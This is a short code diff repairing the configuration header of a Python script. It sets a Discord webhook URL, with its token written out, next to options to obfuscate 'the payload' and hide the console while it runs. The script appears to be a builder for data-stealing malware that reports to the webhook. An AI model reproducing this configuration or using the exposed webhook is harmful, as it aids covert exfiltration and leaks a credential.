@@ -17,8 +17,7 @@ except ImportError:
 
 version = "1.0"
 
-webhook = "https://discord.com/api/webhooks/1126253248710455516/srzlfoUY9vkkgfjkFznp_s4RR9vOSz0mQtJL5-tGs7-Wd8R9uCAT7JQOTRcYzi83FIaG
-" # Webhook URL
+webhook = "https://discord.com/api/webhooks/1126253248710455516/srzlfoUY9vkkgfjkFznp_s4RR9vOSz0mQtJL5-tGs7-Wd8R9uCAT7JQOTRcYzi83FIaG" # Webhook URL
 obfuscate = False # Obfuscate the payload
 hideConsole = False # Hide the console when the payload is ran
 virtualenvir = False
